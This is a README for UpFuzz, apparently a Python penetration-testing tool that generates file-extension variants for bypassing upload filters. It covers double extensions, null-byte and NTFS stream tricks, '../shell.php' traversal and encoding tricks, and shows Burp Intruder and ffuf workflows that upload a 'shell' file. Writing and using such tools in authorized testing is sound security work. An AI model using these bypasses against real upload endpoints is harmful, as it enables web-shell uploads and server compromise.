<p align="center">
  <img src="img/logo.png" alt="UpFuzz Logo" width="300"/>
</p>

<h1 align="center">UpFuzz</h1>

<p align="center">
  <strong>The Ultimate File Upload Bypass Generator</strong>
  <br />
  UpFuzz is a comprehensive Python tool that generates thousands of file extension combinations designed to bypass upload filters and security controls.
  Perfect for penetration testing, bug bounty hunting, and security assessments.
</p>

<p align="center">
  <a href="https://github.com/0xricksanchez/upfuzz/blob/main/LICENSE"><img src="https://img.shields.io/github/license/0xricksanchez/upfuzz" alt="License"></a>
  <a href="https://python.org"><img src="https://img.shields.io/badge/python-3.11%2B-blue" alt="Python Version"></a>
  <a href="https://github.com/0xricksanchez/joomla_brute/releases"><img src="https://img.shields.io/badge/version-v1.0-red" alt="Tool Version"></a>
</p>

## 🎯 Features

- **Smart Extension Generation**: Creates comprehensive lists with double extensions, null bytes, case variations, and encoding bypasses
- **Content-Type Recommendations**: Suggests optimal MIME types for each extension pattern
- **Specialized Attack Presets**: Ready-made configurations for PHP, ASP, JSP, XXE, XSS, and more
- **Multiple Output Formats**: Plain text lists or detailed JSON with metadata
- **Burp Suite Ready**: Generate wordlists perfect for Intruder attacks

## 🚀 Quick Start

### Basic Usage
```bash
# Generate PHP upload bypasses
python3 upfuzz.py --preset php

# XXE-focused extensions for XML/SVG testing  
python3 upfuzz.py --preset xxe

# Comprehensive web application testing
python3 upfuzz.py --preset web --output extensions.txt
```

### Custom Generation
```bash
# Custom malicious + benign extensions
python3 upfuzz.py --malicious .php,.jsp --benign .jpg,.png,.gif

# With custom delimiters
python3 upfuzz.py --preset php --delimiters ",%00,.,%20"
```

## 📋 Available Presets

| Preset | Description | Use Case |
|--------|-------------|----------|
| `web` | PHP, ASP, JSP extensions | General web app testing |
| `php` | Core PHP extensions | PHP application focus |
| `php-comprehensive` | All PHP variants | Exhaustive PHP testing |
| `asp` | ASP/ASPX extensions | Windows/IIS applications |
| `jsp` | Java Server Pages | Java web applications |
| `xxe` | XML/SVG/XSL extensions | XXE vulnerability testing |
| `xss` | SVG/HTML/XML extensions | XSS via file upload |
| `coldfusion` | ColdFusion extensions | Adobe ColdFusion apps |
| `scripting` | Perl, Python, Ruby, etc. | General scripting bypasses |
| `common` | Most exploited extensions | Quick common tests |
| `all` | Every known extension | Comprehensive testing |

## 💡 Example Output

```bash
$ python3 upfuzz.py --preset php --show-content-types

Generating extensions with:
  Malicious: ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar']
  Benign: ['.jpg', '.jpeg', '.png', '.gif', '.bmp']
  Case variations: True
  Content-Type recommendations: True

.php
.php.gif
.php.jpg
.php.jpeg
.php.png
.php%00.jpg
.php%20.gif
.phtml.png
.gif.php
.jpg.php
...

Content-Type Recommendations:
  image/jpeg: .php.jpg, .php.jpeg, .jpg.php
  image/png: .php.png, .png.php  
  application/x-httpd-php: .php, .php3, .php4, .phtml
  text/plain: .php, .phtml, .inc
```

## 🎯 Real-World Usage

### HTB/CTF Scenarios
```bash
# Generate PHP bypasses for image upload forms
python3 upfuzz.py --preset php --output php_bypass.txt

# Load php_bypass.txt into Burp Intruder
# Set payload position at file extension
# Test all combinations against upload endpoint
```

### Bug Bounty Hunting
```bash
# Comprehensive web app testing
python3 upfuzz.py --preset web --output web_extensions.txt

# XXE testing on document uploads
python3 upfuzz.py --preset xxe --output xxe_payloads.txt

# XSS via SVG uploads
python3 upfuzz.py --preset xss --output xss_extensions.txt
```

### Penetration Testing
```bash
# Generate JSON report with metadata
python3 upfuzz.py --preset all --output full_report.json

# Custom extensions for specific technology stack
python3 upfuzz.py --malicious .cfm,.jsp,.php --benign .pdf,.doc,.jpg
```

## 🛠️ Advanced Options

```bash
# Disable case variations for faster generation
python3 upfuzz.py --preset php --no-case-variations

# Hide content-type recommendations
python3 upfuzz.py --preset web --no-content-types

# Custom delimiters for specific bypass techniques
python3 upfuzz.py --preset php --delimiters ",%00,%20,.,;"

# List all available presets
python3 upfuzz.py --list-presets
```

## 📊 Extension Patterns Generated

UpFuzz creates multiple bypass patterns for each malicious extension:

### Basic Patterns
- `.php` → Direct extension
- `.PHP`, `.PhP`, `.pHp` → Case variations

### Double Extensions  
- `.php.jpg` → Malicious first
- `.jpg.php` → Benign first
- `.php.png.gif` → Triple extensions

### Delimiter Bypasses
- `.php%00.jpg` → Null byte injection
- `.php%20.jpg` → Space character
- `.php..jpg` → Double dots
- `.php/.jpg` → Path separators

### Special Techniques
- `.php ` → Trailing spaces
- `../shell.php` → Directory traversal
- `.php%252e.jpg` → Double URL encoding
- `.php::$DATA.jpg` → NTFS ADS

## 🎯 Content-Type Strategy

UpFuzz recommends Content-Types based on your extension strategy:

| Extension Pattern | Recommended Content-Types |
|------------------|---------------------------|
| `.php.jpg` | `image/jpeg`, `application/x-httpd-php` |
| `.svg` | `image/svg+xml`, `text/xml` |
| `.xml` | `application/xml`, `text/xml` |
| `.asp.png` | `image/png`, `application/x-asp` |

## 🔧 Integration

### Burp Suite Integration
1. Generate extension list: `python3 upfuzz.py --preset web -o extensions.txt`
2. In Burp, send upload request to Intruder
3. Set payload position at file extension
4. Load `extensions.txt` as payload list
5. Start attack and analyze responses

### ffuf Integration
```bash
# Generate extensions
python3 upfuzz.py --preset php -o php_ext.txt

# Use with ffuf
ffuf -u "http://target.com/upload" -X POST \
     -F "file=@shell.FUZZ" \
     -w php_ext.txt
```

## 🎲 Example Attack Scenarios

### Scenario 1: Image Upload Bypass
```bash
# Target: Web form accepting only .jpg, .png
python3 upfuzz.py --malicious .php --benign .jpg,.png --output image_bypass.txt

# Generated bypasses include:
# .php.jpg, .jpg.php, .php%00.jpg, .PHP.jpg, etc.
```

### Scenario 2: XXE via SVG Upload
```bash
# Target: Profile picture upload accepting SVG
python3 upfuzz.py --preset xxe --output xxe_test.txt

# Use Content-Type: image/svg+xml
# Upload SVG with XXE payload
```

### Scenario 3: ASP.NET Application
```bash
# Target: Document upload on ASP.NET app
python3 upfuzz.py --preset asp --output asp_bypass.txt

# Test .aspx, .ashx, .config extensions
# Use recommended Content-Types
```

## 🚨 Responsible Disclosure

UpFuzz is designed for authorized penetration testing and security research. Always ensure you have explicit permission before testing upload functionality on systems you don't own.

## 📝 Installation

```bash
# Clone the repository
git clone https://github.com/0xricksanchez/upfuzz.git
cd upfuzz

# Run
python3 upfuzz.py --help
```

## 🤝 Contributing

Contributions welcome! Areas for improvement:
- Additional file extension patterns
- New bypass techniques
- Framework-specific presets
- Integration with other tools

## 📄 License

Apache-2 License - see [LICENSE](LICENSE) file for details

---

**Happy Fuzzing! 🎯**

*Found a new bypass technique? Open an issue or submit a PR!*
